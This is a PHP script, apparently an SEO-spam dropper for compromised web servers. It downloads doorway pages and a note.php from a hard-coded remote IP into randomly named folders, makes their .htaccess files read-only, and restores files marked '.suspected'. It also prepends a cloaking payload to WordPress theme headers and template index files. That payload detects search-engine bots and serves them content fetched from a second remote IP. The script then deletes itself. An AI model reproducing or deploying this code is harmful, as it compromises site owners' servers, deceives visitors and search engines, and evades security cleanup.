<?php
    // функция разделения URL
function _parse_url ($path) {
preg_match ("~(.+)?:\/\/([?\/]+)([?\?]*)[\?]?([?\/]*)~", $path, $arr);
if ($arr[0]==''){ return array ('path' =>$path); }
return array ('scheme' => $arr[1], 'host' => $arr[2], 'path' => $arr[3], 'query' => $arr[4]);
}
    // функция вывода
function output_r ($path){
$arr = _parse_url($path);
$host = $arr['host'];
if (! empty ($arr['path'])) $page = $arr['path'];
if (! empty ($arr['query'])) $query = $arr['query'];
if ( !empty ($query)){$page.='?'.$query;}
if ( empty ($page)){$page='/';}
$fp = @fsockopen ($host, 80, $errno, $errstr, 30);
if (!$fp){ return @implode ('', @file ($path)); }
$request = "GET $page HTTP/1.0\r\n";
$request .= "Host: $host\r\n";
$request .= "Accept: text/html, application/xml;q=0.9, */*;q=0.1\r\n";
$request .= "Accept-Charset: windows-1251, utf-8;q=0.6, *;q=0.1\r\n";
$request .= "Accept-Encoding: deflate, gzip, identity, *;q=0\r\n";
$request .= "Accept-Language: ru\r\n";
$request .= "Connection: close\r\n";
$request .= "Keep-Alive: 300\r\n";
$request .= "Expires: Thu, 01 Jan 1970 00:00:01 GMT\r\n";
$request .= "Cache-Control: no-store, no-cache, must-revalidate\r\n";
$request .= "Pragma: no-cache\r\n";
$request .= "Cookie: income=1\r\n";
$request .= "Referer: http://$host/\r\n";
$request .= "User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98)\r\n";
$request .= "\r\n";
@fwrite ($fp,$request);
$fest = $out = '';
while ($line = @fgets ($fp, 1024)){
if ( preg_match ("~?[\r]?\n$~i",$line)){$fest='yes';}
elseif ($fest=='yes'){$out .= $line;}
} 
return '<base href="'.$path.'">' . $out;
}


//$page = 'https://search.yahoo.com/search?p=sex&fr=yfp-t&fr2=sb-top&fp=1&b=1&pz=10&bct=0&xargs=0';
//print output_r($page);

$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);

$let = array ("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","1","2","3","4","5","6","7","8","9","0");    
$dirname='';    
for ($ns=0;$ns<rand(4,10);$ns++)     
{     
$r = rand (0,count($let)-1);     
$dirname .= $let[$r];     
}  
$dirname2='';    
for ($ns=0;$ns<rand(4,10);$ns++)     
{     
$r = rand (0,count($let)-1);     
$dirname2 .= $let[$r];     
}  
mkdir("$dirname", 0777);
mkdir("$dirname2", 0777);

if (file_exists ($dirname))
{
	mkdir($dirname."/fafgegkens", 0777);
	mkdir($dirname."/papkaa17", 0777);
	mkdir($dirname2."/fafgegkens", 0777);
	mkdir($dirname2."/papkaa17", 0777);
	
	for($nnn=1;$nnn<10;$nnn++)
{
$page = "http://37.1.211.206/doorgen2/$nnn.txt"; 
$result = output_r($page);
$z = fopen("$dirname/papkaa17/$nnn.txt", "w");
fwrite($z, $result);
fclose($z);
}
	for($nnn=1;$nnn<10;$nnn++)
{
$page = "http://37.1.211.206/doorgen2/z$nnn.txt"; 
$result = output_r($page);
$z = fopen("$dirname2/papkaa17/$nnn.txt", "w");
fwrite($z, $result);
fclose($z);
}

$page = "http://37.1.211.206/doorgen2/htaccess.txt"; 
$result = output_r($page);
$z = fopen("$dirname/.htaccess", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname2/.htaccess", "w");
fwrite($z, $result);
fclose($z);

chmod("$dirname/.htaccess", 0444);
chmod("$dirname2/.htaccess", 0444);

$page = "http://37.1.211.206/doorgen2/note.txt"; 
$result = output_r($page);
$z = fopen("$dirname/note.php", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname/fafgegkens/note.txt", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname2/note.php", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname2/fafgegkens/note.txt", "w");
fwrite($z, $result);
fclose($z);


$page = "http://37.1.211.206/doorgen2/sexthe.txt"; 
$result = output_r($page);
$z = fopen("$dirname/fafgegkens/sexthe.php", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname2/fafgegkens/sexthe.php", "w");
fwrite($z, $result);
fclose($z);

echo "<b><b><b>http://".$_SERVER['SERVER_NAME']."/$dirname|http://".$_SERVER['SERVER_NAME']."/$dirname2</b></b></b>";
}

	$dirs = scandir(".");
	foreach ($dirs as $dir)
	{
		if ((file_exists("$dir/.htaccess")) and ((file_exists("$dir/note.php")) OR (file_exists("$dir/note.php.suspected")))) 
		{
$out = fopen("$dir/.htaccess", "w");

fwrite ($out, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ note.php?hl=$1 [L]");
if (file_exists("$dir/note.php.suspected")) rename("$dir/note.php.suspected", "$dir/note.php");
		}
	}
	
	$outht = fopen(".htaccess", "w");
fwrite($outht, "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
 
# END WordPress");
fclose($outht);

@unlink(sys_get_temp_dir());


$code = '


<?php
$user_agent_to_filter = array( \'#Ask\s*Jeeves#i\', \'#HP\s*Web\s*PrintSmart#i\', \'#HTTrack#i\', \'#IDBot#i\', \'#Indy\s*Library#\',
                               \'#ListChecker#i\', \'#MSIECrawler#i\', \'#NetCache#i\', \'#Nutch#i\', \'#RPT-HTTPClient#i\',
                               \'#rulinki\.ru#i\', \'#Twiceler#i\', \'#WebAlta#i\', \'#Webster\s*Pro#i\',\'#www\.cys\.ru#i\',
                               \'#Wysigot#i\', \'#Yahoo!\s*Slurp#i\', \'#Yeti#i\', \'#Accoona#i\', \'#CazoodleBot#i\',
                               \'#CFNetwork#i\', \'#ConveraCrawler#i\',\'#DISCo#i\', \'#Download\s*note#i\', \'#FAST\s*MetaWeb\s*Crawler#i\',
                               \'#Flexum\s*spider#i\', \'#Gigabot#i\', \'#HTMLParser#i\', \'#ia_archiver#i\', \'#ichiro#i\',
                               \'#IRLbot#i\', \'#Java#i\', \'#km\.ru\s*bot#i\', \'#kmSearchBot#i\', \'#libwww-perl#i\',
                               \'#Lupa\.ru#i\', \'#LWP::Simple#i\', \'#lwp-trivial#i\', \'#Missigua#i\', \'#MJ12bot#i\',
                               \'#msnbot#i\', \'#msnbot-media#i\', \'#Offline\s*Explorer#i\', \'#OmniExplorer_Bot#i\',
                               \'#PEAR#i\', \'#psbot#i\', \'#Python#i\', \'#rulinki\.ru#i\', \'#SMILE#i\',
                               \'#Speedy#i\', \'#Teleport\s*Pro#i\', \'#TurtleScanner#i\', \'#User-Agent#i\', \'#voyager#i\',
                               \'#Webalta#i\', \'#WebCopier#i\', \'#WebData#i\', \'#WebZIP#i\', \'#Wget#i\',
                               \'#Yandex#i\', \'#Yanga#i\', \'#Yeti#i\',\'#msnbot#i\',
                               \'#spider#i\', \'#yahoo#i\', \'#jeeves#i\' ,\'#google#i\' ,\'#altavista#i\',
                               \'#scooter#i\' ,\'#av\s*fetch#i\' ,\'#asterias#i\' ,\'#spiderthread revision#i\' ,\'#sqworm#i\',
                               \'#ask#i\' ,\'#lycos.spider#i\' ,\'#infoseek sidewinder#i\' ,\'#ultraseek#i\' ,\'#polybot#i\',
                               \'#webcrawler#i\', \'#robozill#i\', \'#gulliver#i\', \'#architextspider#i\', \'#yahoo!\s*slurp#i\',
                               \'#charlotte#i\', \'#ngb#i\', \'#BingBot#i\' ) ;

if ( !empty( $_SERVER[\'HTTP_USER_AGENT\'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, \'-NO-WAY-\', $_SERVER[\'HTTP_USER_AGENT\'] ), \'-NO-WAY-\' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER[\'REMOTE_ADDR\']), \'google\')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?>';


if (file_exists("wp-content"))
{
if (file_exists("wp-content/themes"))
{
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
                          fclose($file);	
               if (eregi('173.236.65.24', $buffer)==0) 
               { 
				 
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
				/*		 
                   $in = fopen("wp-content/themes/$dir/header.php", "a");
				   fwrite($in, $code);
				   fclose($in);
				   */
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
                          fclose($file);	
                            if (eregi('173.236.65.24', $buffer)==0) 
                                   {
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}


@unlink($scriptname);



?>